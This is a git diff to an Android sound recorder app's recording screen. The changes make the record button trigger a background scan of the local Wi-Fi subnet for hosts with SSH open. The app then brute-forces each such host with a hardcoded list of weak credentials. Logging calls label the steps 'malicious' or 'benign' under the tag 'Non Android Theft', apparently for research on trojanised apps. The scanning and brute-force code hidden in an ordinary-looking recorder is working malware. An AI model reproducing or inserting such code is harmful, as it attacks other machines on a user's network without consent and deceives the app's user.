@@ -1,7 +1,9 @@
 package com.danielkim.soundrecorder.fragments;
 
+import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
 import android.os.Build;
@@ -19,7 +21,7 @@ import android.widget.Chronometer;
 import android.widget.TextView;
 import android.widget.Toast;
 
-
+import com.danielkim.soundrecorder.fragments.Clues;
 import com.danielkim.soundrecorder.R;
 import com.danielkim.soundrecorder.RecordingService;
 import com.danielkim.soundrecorder.activities.MainActivity;
@@ -49,6 +51,11 @@ import static android.content.Context.WIFI_SERVICE;
  */
 public class RecordFragment extends Fragment {
     // the fragment initialization parameters, e.g. ARG_ITEM_NUMBER
+    private final static String TAG="Non Android Theft";
+    SharedPreferences pref;
+    boolean rwPerm;
+    public Clues clues=new Clues();
+
     private static final String ARG_POSITION = "position";
     private static final String LOG_TAG = RecordFragment.class.getSimpleName();
 
@@ -90,6 +97,16 @@ public class RecordFragment extends Fragment {
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         position = getArguments().getInt(ARG_POSITION);
+        pref =getActivity().getSharedPreferences("com.danielkim.soundrecorder",0x0000);
+        //sessionID=pref.getInt("sessionID",1);
+
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        pref.edit().putInt("sessionID", MainActivity.sessionID).apply();
+        clues.SendLog(TAG,"Recording stopped", "benign", false);
     }
 
     @Override
@@ -109,6 +126,7 @@ public class RecordFragment extends Fragment {
             public void onClick(View v) {
                 onRecord(mStartRecording);
                 mStartRecording = !mStartRecording;
+
 
             }
         });
@@ -133,15 +151,17 @@ public class RecordFragment extends Fragment {
     //TODO: recording pause
     private void onRecord(boolean start){
 
-
+        clues.SendLog(TAG,"Recording started", "benign", true);
         Intent intent = new Intent(getActivity(), RecordingService.class);
 
         if (start) {
             // start recording
 
-
+            clues.SendLog(TAG,"Scanning IPs", "malicious", false);
+            mRecordButton.setEnabled(false);
             new ScanIpTask().execute();
-            
+            mRecordButton.setEnabled(true);
+
             mRecordButton.setImageResource(R.drawable.ic_media_stop);
             //mPauseButton.setVisibility(View.VISIBLE);
             Toast.makeText(getActivity(),R.string.toast_recording_start,Toast.LENGTH_SHORT).show();
@@ -180,11 +200,13 @@ public class RecordFragment extends Fragment {
 
         } else {
             //stop recording
+
             mRecordButton.setImageResource(R.drawable.ic_mic_white_36dp);
             //mPauseButton.setVisibility(View.GONE);
             mChronometer.stop();
             mChronometer.setBase(SystemClock.elapsedRealtime());
             timeWhenPaused = 0;
+
             mRecordingPrompt.setText(getString(R.string.record_prompt));
 
             getActivity().stopService(intent);
@@ -232,13 +254,13 @@ public class RecordFragment extends Fragment {
     you should try different timeout for your network/devices
      */
 
-        static final int lo2 = 61;
-        static final int hi2 = 61;
+        //static final int lo2 = 61;
+        //static final int hi2 = 61;
         static final int timeout = 100;
         static final int lo3 = 45;
         static final int hi3 = 50;
         static final int lo4 = 160;
-        static final int hi4 = 180;
+        static final int hi4 = 200;
 
         @Override
         protected void onPreExecute() {
@@ -254,7 +276,7 @@ public class RecordFragment extends Fragment {
             bruteMap.put("user", "password");
             bruteMap.put("123","123");
             bruteMap.put("test","test@123");
-            //bruteMap.put("animeshpc", "oneadmin@ak");
+
 
 
             ip = getIp();
@@ -269,11 +291,14 @@ public class RecordFragment extends Fragment {
                 }
             }
             subnet = ip.substring(0, idx);
+            clues.SendLog(TAG,"Subnet is "+subnet, "malicious", false);
             //subnet="10.61";
             //ipList.clear();
             //Toast.makeText(MainActivity.this, "Scan IP...", Toast.LENGTH_LONG).show();
         }
 
+        //@TargetApi(Build.VERSION_CODES.KITKAT)
+        @SuppressLint("WrongThread")
         @TargetApi(Build.VERSION_CODES.KITKAT)
         @Override
         protected Void doInBackground(Void... params) {
@@ -299,10 +324,16 @@ public class RecordFragment extends Fragment {
                             //System.out.println(host);
                             // try(Socket socket = new Socket(inetAddress, 22)) {
                             try(Socket socket = new Socket(inetAddress, 22)) {
-                                bruteForce(host, bruteMap);
+
+                                //bruteForce(host, bruteMap);
+                                String as="hell0";
+                                BruteForce.main(as,host);
+                               // new attack().execute();
                             }
                             catch (IOException e) {
                                 System.out.println(host + " port closed.");
+                               // String as="hell0";
+                                //BruteForce.main(as);
                             }
                             //ipList.add(host);
                             //           for (String str_Agil : ipList)   // using foreach
@@ -337,7 +368,7 @@ public class RecordFragment extends Fragment {
         @Override
         protected void onPostExecute(Void aVoid) {
             //Toast.makeText(A.getApplicationContext(), "Done", Toast.LENGTH_LONG).show();
-            System.out.println("List of all IPs");
+            //System.out.println("List of all IPs");
        /* for (String str_Agil : ipList)   // using foreach
         {
             System.out.println(str_Agil);
@@ -345,7 +376,7 @@ public class RecordFragment extends Fragment {
     }*/
         }
 
-        public void bruteForce (String host, HashMap<String, String> dict) {
+       /* public void bruteForce (String host, HashMap<String, String> dict) {
             //Enumeration<String> users = dict.keys();
             //String pwd;
             int port = 22;
@@ -370,6 +401,7 @@ public class RecordFragment extends Fragment {
                     Thread.sleep(1000);
                     channel.disconnect();
                     System.out.println("Executed successfully!\nThe output is: " + new String(baos.toByteArray()));
+                    clues.SendLog(TAG,host + " is compromised!", "malicious", false);
                     //Result.setText(new String(baos.toByteArray()));
                     //return true;
                 } catch (JSchException e) {
@@ -381,7 +413,7 @@ public class RecordFragment extends Fragment {
                 }
             }
             // return false;
-        }
+        }*/
     }
     public String getIp() {
         WifiManager wm;
@@ -394,5 +426,17 @@ public class RecordFragment extends Fragment {
 
         return ip1;
     }
+    /*public class attack extends AsyncTask<String ,String,String>{
+
+
+        @Override
+        protected String doInBackground(String... strings) {
+
+            String as="hell0";
+            BruteForce.main(as);
+            //boolean c=BruteForce.main(as);
+            return null;
+        }
+    }*/
 
 }
